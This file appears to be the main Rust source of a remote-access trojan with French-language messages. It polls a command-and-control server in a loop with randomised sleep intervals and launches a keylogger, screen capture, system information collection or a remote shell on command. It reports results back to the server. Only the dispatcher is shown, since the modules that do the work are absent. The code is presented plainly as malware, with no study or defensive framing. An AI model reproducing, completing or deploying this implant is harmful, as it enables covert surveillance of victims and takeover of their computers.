mod connexion;
mod input;
mod logs;
mod screenshot;
mod shell;
use rand::Rng;
use tokio::task::JoinHandle;

#[tokio::main]

async fn main() {
    loop {
        match connexion::get_directives().await {
            Ok(commands) => {
                println!("Commands received: {:?}", commands);
                let mut handles: Vec<JoinHandle<()>> = Vec::new();

                for command in commands {
                    match command.as_str() {
                        "keylogger" => {
                            let handle = tokio::spawn(async {
                                println!("Démarrage du keylogger...");
                                match input::start_keylogger(10).await {
                                    Ok(_) => {
                                        println!("Keylogger terminé");
                                        let _ = connexion::send_directive_status(
                                            "keylogger",
                                            "success",
                                            "Terminé",
                                        )
                                        .await;
                                    }
                                    Err(e) => {
                                        eprintln!("Erreur keylogger: {:?}", e);
                                        let _ = connexion::send_directive_status(
                                            "keylogger",
                                            "error",
                                            &format!("{:?}", e),
                                        )
                                        .await;
                                    }
                                }
                                println!("Keylogger terminé");
                            });
                            handles.push(handle);
                        }
                        "screenshot" => {
                            let handle = tokio::spawn(async {
                                println!("Prise de screenshot...");
                                match screenshot::take_screenshot().await {
                                    Ok(_) => {
                                        println!("Screenshot terminé");
                                        let _ = connexion::send_directive_status(
                                            "screenshot",
                                            "success",
                                            "Terminé",
                                        )
                                        .await;
                                    }
                                    Err(e) => {
                                        eprintln!("Erreur Screenshot: {:?}", e);
                                        let _ = connexion::send_directive_status(
                                            "screenshot",
                                            "error",
                                            &format!("{:?}", e),
                                        )
                                        .await;
                                    }
                                }
                                println!("Screenshot terminé");
                            });
                            handles.push(handle);
                        }
                        "logs" => {
                            let handle = tokio::spawn(async {
                                println!("Récupération des logs système...");
                                match logs::get_sysinfo().await {
                                    Ok(_) => {
                                        println!("Screenshot terminé");
                                        let _ = connexion::send_directive_status(
                                            "logs", "success", "Terminé",
                                        )
                                        .await;
                                    }
                                    Err(e) => {
                                        eprintln!("Erreur Screenshot: {:?}", e);
                                        let _ = connexion::send_directive_status(
                                            "logs",
                                            "error",
                                            &format!("{:?}", e),
                                        )
                                        .await;
                                    }
                                }
                                println!("Logs terminés");
                            });
                            handles.push(handle);
                        }
                        "shell" => {
                            let handle = tokio::spawn(async {
                                println!("Démarrage du shell distant");
                                match shell::launch_shell().await {
                                    Ok(_) => {
                                        println!("Shell terminé");
                                        let _ = connexion::send_directive_status(
                                            "shell",
                                            "success",
                                            "Session shell terminée",
                                        )
                                        .await;
                                    }
                                    Err(e) => {
                                        eprintln!("Erreur shell : {}", e);
                                        let _ = connexion::send_directive_status(
                                            "shell",
                                            "error",
                                            &format!("Erreur shell : {:?}", e),
                                        )
                                        .await;
                                    }
                                }
                            });
                            handles.push(handle);
                        }
                        _ => println!("Commande inconnue: {}", command),
                    }
                }
                for (i, handle) in handles.into_iter().enumerate() {
                    match handle.await {
                        Ok(_) => println!("Tâche {} terminée avec succès", i),
                        Err(e) => eprintln!("Tâche {} a paniqué : {:?}", i, e),
                    }
                }
            }
            Err(e) => eprintln!("Erreur avec la connexion au C2: {}", e),
        }
        let delay = rand::rng().random_range(5..15);
        tokio::time::sleep(std::time::Duration::from_secs(delay)).await;
    }
}
